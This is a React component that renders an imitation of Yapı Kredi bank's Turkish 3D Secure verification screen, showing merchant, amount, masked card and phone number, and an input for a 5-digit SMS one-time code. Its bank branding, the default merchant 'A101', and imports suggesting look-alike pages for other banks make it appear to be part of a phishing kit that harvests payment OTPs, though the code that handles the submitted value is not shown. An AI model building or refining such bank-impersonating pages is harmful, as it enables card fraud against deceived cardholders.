'use client';

import CardSchemeBadge from '@/components/CardSchemeBadge';
import BankLogo from '@/components/banks/logos/BankLogo';
import ThreeDSecureShell from './ThreeDSecureShell';
import {
  formatAmount,
  formatDateYapikredi,
  maskCardYapikredi,
  maskPhoneYapikredi,
} from './threeDSecureUtils';
import type { BankThreeDSecureProps } from './types';

function InfoIcon() {
  return (
    <span className="mr-1.5 inline-flex h-4 w-4 shrink-0 items-center justify-center rounded-full bg-[#0055a5] text-[10px] font-bold text-white">
      i
    </span>
  );
}

export default function YapiKrediThreeDSecurePage({
  amount,
  cardNumber,
  phoneNumber,
  verificationCode,
  onVerificationCodeChange,
  error,
  loading,
  transactionDate,
  merchantName = 'A101',
  onSubmit,
  onCancel,
}: BankThreeDSecureProps) {
  const formattedAmount = formatAmount(amount);
  const canSubmit = verificationCode.length === 5 && !loading;

  const rows = [
    { label: 'Üye İşyeri İsmi', value: merchantName.toUpperCase() },
    { label: 'Tutar', value: `${formattedAmount} TL` },
    { label: 'Tarih', value: formatDateYapikredi(transactionDate) },
    { label: 'Kart Numarası', value: maskCardYapikredi(cardNumber), mono: true },
    { label: 'Cep Telefonu', value: maskPhoneYapikredi(phoneNumber), mono: true },
  ];

  return (
    <ThreeDSecureShell onClose={onCancel} outerClassName="bg-[#0055a5]">
      <div className="overflow-hidden border-[10px] border-[#b8d4f0] bg-white">
        <div className="flex items-center justify-between bg-[#0055a5] px-3 py-2.5 text-white">
          <span className="text-[13px] font-semibold">Üç Boyutlu Güvenlik Sistemi</span>
          <div className="flex items-center gap-2 text-xs">
            <span className="flex h-5 w-5 items-center justify-center rounded-full border border-white/70 text-[11px]">
              ?
            </span>
            <span className="font-semibold">EN</span>
          </div>
        </div>

        <div className="bg-white px-4 pb-3 pt-4">
          <div className="mb-4 flex items-center justify-between gap-2">
            <BankLogo bankId="yapikredi" height={28} />
            <div className="flex items-center gap-2">
              <CardSchemeBadge cardNumber={cardNumber} compact />
              <span className="text-[11px] font-bold text-[#0055a5]"></span>
            </div>
          </div>

          <div className="space-y-2.5">
            {rows.map((row) => (
              <div key={row.label} className="flex items-start justify-between gap-3 text-[13px]">
                <span className="shrink-0 text-gray-500">{row.label}</span>
                <span
                  className={`text-right font-bold text-gray-900 ${row.mono ? 'tracking-wide' : ''}`}
                >
                  {row.value}
                </span>
              </div>
            ))}
          </div>

          <p className="mt-4 flex items-center text-[12px] font-medium text-[#0055a5]">
            <InfoIcon />
            Bu bilgiler işyerleri ile paylaşılmamaktadır.
          </p>
        </div>

        <div className="bg-[#f0f7ff] px-4 py-4">
          {error && (
            <div className="mb-3 rounded border border-red-200 bg-red-50 px-3 py-2 text-center text-xs text-red-600">
              {error}
            </div>
          )}

          <form onSubmit={onSubmit}>
            <div className="mb-3 flex items-center gap-3">
              <label className="shrink-0 text-[13px] font-semibold text-gray-900">
                Akıllı SMS Şifresi
              </label>
              <input
                type="password"
                inputMode="numeric"
                autoComplete="one-time-code"
                value={verificationCode}
                onChange={(e) => onVerificationCodeChange(e.target.value.replace(/\D/g, '').slice(0, 5))}
                maxLength={5}
                className="min-w-0 flex-1 rounded border border-gray-300 bg-white px-3 py-2 text-sm outline-none focus:border-[#00a8ff]"
              />
            </div>

            <p className="mb-1 text-[12px] text-gray-800">
              Cep telefonu numaranızı değiştirmek için{' '}
              <button type="button" className="font-medium text-[#00a8ff] underline">
                tıklayınız
              </button>
              .
            </p>
            <p className="mb-4 text-[12px] text-gray-800">
              Akıllı Bildirim ile doğrulamak için{' '}
              <button type="button" className="font-medium text-[#00a8ff] underline">
                tıklayınız
              </button>
              .
            </p>

            <div className="flex gap-3">
              <button
                type="button"
                onClick={onCancel}
                className="flex-1 rounded border-2 border-[#00a8ff] bg-white py-2.5 text-sm font-semibold text-[#00a8ff]"
              >
                Vazgeç
              </button>
              <button
                type="submit"
                disabled={!canSubmit}
                className={`flex-1 rounded py-2.5 text-sm font-semibold text-white transition-colors duration-200 ${
                  canSubmit ? 'bg-[#00a8ff]' : 'bg-[#99daf8]'
                }`}
              >
                {loading ? 'Gönderiliyor...' : 'Onay'}
              </button>
            </div>
          </form>
        </div>

        <div className="h-3 bg-[#0055a5]" />
      </div>
    </ThreeDSecureShell>
  );
}
